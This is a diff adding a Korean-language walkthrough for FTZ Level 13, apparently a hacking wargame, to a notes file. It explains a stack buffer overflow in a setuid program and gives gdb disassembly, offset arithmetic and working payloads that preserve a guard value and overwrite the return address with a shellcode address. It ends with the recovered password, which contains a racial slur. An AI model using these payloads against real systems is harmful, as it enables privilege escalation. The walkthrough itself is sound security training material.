@@ -237,3 +237,93 @@ my-pass로 하면 답이 나온다.
 
 
 
+
+#================================================================================#
+#FTZ Level 13
+hint)
+#include <stdlib.h> 
+
+main(int argc, char *argv[])
+{
+   long i=0x1234567;
+   char buf[1024];
+
+   setreuid( 3094, 3094 );
+   if(argc > 1)
+   strcpy(buf,argv[1]);
+
+   if(i != 0x1234567) {
+   printf(" Warnning: Buffer Overflow !!! \n");
+   kill(0,11);
+   }
+}
+
+
+#FTZ Level 13 풀이 과정)
+코드를 보면 i에 0x1234567을 넣고 그다음 char형 배열을 1024크기를 할당한다.
+그리고 setreuid 함수 실행. 
+일단 실행시킬때 인자가 하나 이상 들어와야 buf에 넣을테고, 인자가 페이로드로 들어가면 되겠다.
+if에서 걸리는 것이 있다 i 변수의 값이 0x1234567이 아니면 버퍼오버플로우라고 막는 것이다.
+
+일단 /tmp/13에 attackme를 복사해 gdb로 까봤다.
+
+0x080484a0 <main+0>:	push   ebp
+0x080484a1 <main+1>:	mov    ebp,esp
+0x080484a3 <main+3>:	sub    esp,0x418
+0x080484a9 <main+9>:	mov    DWORD PTR [ebp-12],0x1234567
+0x080484b0 <main+16>:	sub    esp,0x8
+0x080484b3 <main+19>:	push   0xc16
+0x080484b8 <main+24>:	push   0xc16
+0x080484bd <main+29>:	call   0x8048370 <setreuid>
+0x080484c2 <main+34>:	add    esp,0x10
+0x080484c5 <main+37>:	cmp    DWORD PTR [ebp+8],0x1
+0x080484c9 <main+41>:	jle    0x80484e5 <main+69>
+0x080484cb <main+43>:	sub    esp,0x8
+0x080484ce <main+46>:	mov    eax,DWORD PTR [ebp+12]
+0x080484d1 <main+49>:	add    eax,0x4
+0x080484d4 <main+52>:	push   DWORD PTR [eax]
+0x080484d6 <main+54>:	lea    eax,[ebp-1048]
+0x080484dc <main+60>:	push   eax
+0x080484dd <main+61>:	call   0x8048390 <strcpy>
+0x080484e2 <main+66>:	add    esp,0x10
+0x080484e5 <main+69>:	cmp    DWORD PTR [ebp-12],0x1234567
+0x080484ec <main+76>:	je     0x804850d <main+109>
+0x080484ee <main+78>:	sub    esp,0xc
+0x080484f1 <main+81>:	push   0x80485a0
+0x080484f6 <main+86>:	call   0x8048360 <printf>
+0x080484fb <main+91>:	add    esp,0x10
+0x080484fe <main+94>:	sub    esp,0x8
+0x08048501 <main+97>:	push   0xb
+0x08048503 <main+99>:	push   0x0
+0x08048505 <main+101>:	call   0x8048380 <kill>
+0x0804850a <main+106>:	add    esp,0x10
+0x0804850d <main+109>:	leave  
+0x0804850e <main+110>:	ret    
+0x0804850f <main+111>:	nop  
+
+
+스택에 1048의 크기를 할당하는 것을 볼 수 있다.
+그 이후 [ebp-12]부분에 0x1234567을 넣는 것이 보인다.
+buf의 위치를 찾고자 strcpy의 함수가 실행되기 전 push하는 곳을 찾으니
+[ebp-1048]에 위치한다. 스택에서 i 변수 아래에 buf가 생성되었다.
+
+i는 건들면 안되기에 bof 될때 i변수의 값은 유지한 채 ret에 도달해보자.
+1048-12를 하면 1036에 i 부분이 있고 이 값이 바뀌면 오류가 뜰 것이다. 확인해보자.
+작성한 페이로드는 이렇다.
+./attackme $(python -c 'print "A"*1036') ->
+Warnning: Buffer Overflow !!! 
+Segmentation fault
+
+이렇게 뜬다. 확실히 그 쪽에 위치한 것 같으니. 이제 그곳에 0x1234567의 값을 넣자. 리틀엔디언으로 넣어줘야한다.
+작성한 페이로드는 이렇다.
+./attackme $(python -c 'print "A"*1036+"\x67\x45\x23\x01"')
+이렇게 작성하면 순조롭게 작성한다. 좋다. 그럼 이제 i부분은 그대로 유지한채 ret으로 가야겠다.
+디버그용 payload
+./attackme $(python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12') ->
+Segmentation fault
+세그먼트 오류가 뜬다. 그럼 여기다가 EGGSHELL 주소값을 넣어주면 실행된다!
+
+작성한 페이로드
+./attackme $(python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\xc5\xf2\xff\xbf"')
+
+답 == what that nigga want?
